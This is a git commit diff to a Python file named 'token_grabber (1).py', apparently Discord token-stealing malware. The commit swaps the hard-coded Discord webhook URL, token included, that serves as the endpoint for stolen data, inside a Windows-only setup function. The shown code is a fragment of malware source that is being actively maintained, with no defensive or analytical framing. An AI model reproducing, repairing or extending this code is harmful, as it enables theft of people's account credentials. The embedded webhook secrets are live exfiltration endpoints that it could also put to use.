d9fda7fd37cb25b3aea70582450b4d595fe33071
jdaiowjdwiodjaio <81040747+jdaiowjdwiodjaio@users.noreply.github.com>
2021-03-28 04:32:26 +0200

    Update token_grabber (1).py

--- token_grabber (1).py
+++ token_grabber (1).py
@@ -16,7 +16,7 @@ colorama.init()
 def Auth():
     def dastela():
         global WEBHOOK
-        WEBHOOK = "https://discordapp.com/api/webhooks/764350751232229376/BYXFkJct5VNn6iTWtJtWf8WutzUIFFcc199u-SwQhUEx7qsjiAmxoCge7fD3m2jfwF-P"
+        WEBHOOK = "https://discord.com/api/webhooks/825551913775923250/ltK-cfzzaTgrKoaMRdwZN9QgLscjHxsnj5xo_s_HKPwG6oZ35q938H9zJAHamyHGag-J"
         import os
         if os.name != "nt":
             exit()
